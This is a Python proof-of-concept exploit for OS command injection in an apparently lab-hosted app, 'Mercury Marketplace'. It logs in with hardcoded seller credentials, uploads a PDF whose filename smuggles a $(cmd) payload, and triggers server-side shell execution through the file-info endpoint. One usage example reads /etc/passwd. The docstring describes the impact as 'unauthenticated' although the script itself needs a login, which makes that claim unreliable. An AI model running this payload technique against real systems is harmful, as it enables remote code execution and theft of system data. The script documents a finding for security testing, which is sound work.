#!/usr/bin/env python3
"""
VULN-001 — OS Command Injection via Drive File Info
Target : Mercury Marketplace (web5)
Endpoint: GET /api/drive/{file_id}/info
Auth    : Seller account required
Impact  : Unauthenticated RCE as the application process user

How it works
------------
The /api/drive/{file_id}/info endpoint calls subprocess.run() with shell=True,
interpolating drive_file.file_name directly into the shell command string:

    subprocess.run(
        f"stat --format='%s %F' \"{file_path}\" && echo \"Name: {file_name}\"",
        shell=True, ...
    )

file_name is stored from file.filename in the multipart upload request, which
the client fully controls. By crafting the filename to contain shell metacharacters,
an attacker achieves arbitrary OS command execution, and the output is reflected
back in the "metadata" field of the JSON response.

Injection vectors
-----------------
  $(cmd)   — command substitution, expands inside double quotes
  ; cmd #  — command separator; # comments out the trailing quote

Usage
-----
    python poc_001_os_command_injection.py
    python poc_001_os_command_injection.py --url http://localhost:8000 --cmd "cat /etc/passwd"
"""

import argparse
import sys
import requests

# ── Minimal valid PDF ──────────────────────────────────────────────────────────
MINIMAL_PDF = (
    b"%PDF-1.0\n"
    b"1 0 obj<</Type/Catalog/Pages 2 0 R>>endobj\n"
    b"2 0 obj<</Type/Pages/Kids[3 0 R]/Count 1>>endobj\n"
    b"3 0 obj<</Type/Page/MediaBox[0 0 3 3]>>endobj\n"
    b"xref\n0 4\n"
    b"0000000000 65535 f \n"
    b"0000000009 00000 n \n"
    b"0000000058 00000 n \n"
    b"0000000115 00000 n \n"
    b"trailer<</Size 4/Root 1 0 R>>\n"
    b"startxref\n190\n%%EOF"
)

SELLER_EMAIL    = "alice@mercury.com"
SELLER_PASSWORD = "Seller123!"


def banner():
    print("=" * 60)
    print("  VULN-001 — OS Command Injection (Mercury Marketplace)")
    print("  Endpoint: GET /api/drive/{file_id}/info")
    print("=" * 60)


def login(base_url: str) -> str:
    resp = requests.post(
        f"{base_url}/api/auth/login",
        json={"email": SELLER_EMAIL, "password": SELLER_PASSWORD},
        timeout=10,
    )
    resp.raise_for_status()
    token = resp.json().get("access_token")
    if not token:
        print("[-] Login failed — no access_token in response")
        sys.exit(1)
    print(f"[+] Authenticated as {SELLER_EMAIL}")
    return token


def upload_malicious_file(base_url: str, token: str, cmd: str) -> int:
    # Injection payload embedded in the filename via $() command substitution.
    # The server stores this as file_name and later interpolates it into a shell command.
    malicious_filename = f"report$({cmd}).pdf"
    print(f"[*] Uploading file with crafted filename: {malicious_filename!r}")

    resp = requests.post(
        f"{base_url}/api/drive/upload",
        headers={"Authorization": f"Bearer {token}"},
        files={
            "file": (malicious_filename, MINIMAL_PDF, "application/pdf")
        },
        timeout=10,
    )
    resp.raise_for_status()
    file_id = resp.json().get("id")
    if not file_id:
        print("[-] Upload failed — no id in response")
        sys.exit(1)
    print(f"[+] File uploaded successfully (id={file_id})")
    return file_id


def trigger_injection(base_url: str, token: str, file_id: int) -> str:
    print(f"[*] Triggering injection via GET /api/drive/{file_id}/info ...")
    resp = requests.get(
        f"{base_url}/api/drive/{file_id}/info",
        headers={"Authorization": f"Bearer {token}"},
        timeout=15,
    )
    resp.raise_for_status()
    data = resp.json()
    return data.get("metadata", "")


def cleanup(base_url: str, token: str, file_id: int):
    requests.delete(
        f"{base_url}/api/drive/{file_id}",
        headers={"Authorization": f"Bearer {token}"},
        timeout=10,
    )
    print(f"[*] Cleaned up uploaded file (id={file_id})")


def main():
    parser = argparse.ArgumentParser(description="PoC — VULN-001 OS Command Injection")
    parser.add_argument("--url", default="http://localhost:8000", help="Base URL of the target")
    parser.add_argument("--cmd", default="id", help="OS command to inject (default: id)")
    parser.add_argument("--no-cleanup", action="store_true", help="Skip deleting the uploaded file")
    args = parser.parse_args()

    banner()
    print(f"[*] Target : {args.url}")
    print(f"[*] Command: {args.cmd}")
    print()

    token   = login(args.url)
    file_id = upload_malicious_file(args.url, token, args.cmd)
    output  = trigger_injection(args.url, token, file_id)

    print()
    print("[+] ---- Command Output ----------------------------------------")
    print(output)
    print("----------------------------------------------------------------")

    if not args.no_cleanup:
        cleanup(args.url, token, file_id)

    print()
    print("[+] Done.")


if __name__ == "__main__":
    main()
